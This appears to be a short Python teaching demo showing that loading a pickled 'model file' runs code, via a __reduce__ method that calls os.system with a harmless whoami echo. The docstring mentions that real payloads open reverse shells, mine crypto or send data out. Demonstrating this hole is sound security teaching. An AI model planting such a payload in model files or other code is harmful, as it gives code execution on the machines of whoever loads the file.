"""Week 13 demo D1 - a "model file" that runs code when loaded.

Harmless on purpose: the payload only prints your user name. A real one would open a reverse shell,
start a crypto miner or send data out (see JFrog 2024, malicious models on Hugging Face).

Run:  python security/demos/pickle_demo.py
"""
import os
import pickle


class Model:
    def __reduce__(self):
        # pickle calls this to know how to rebuild the object -> it can be ANY function
        return (os.system, ("echo pwned: $(whoami)",))


blob = pickle.dumps(Model())      # this is the "model file" someone uploads
print(f"model file: {len(blob)} bytes - now we only *load* it ...", flush=True)
pickle.loads(blob)                # ...and the command above runs on our machine
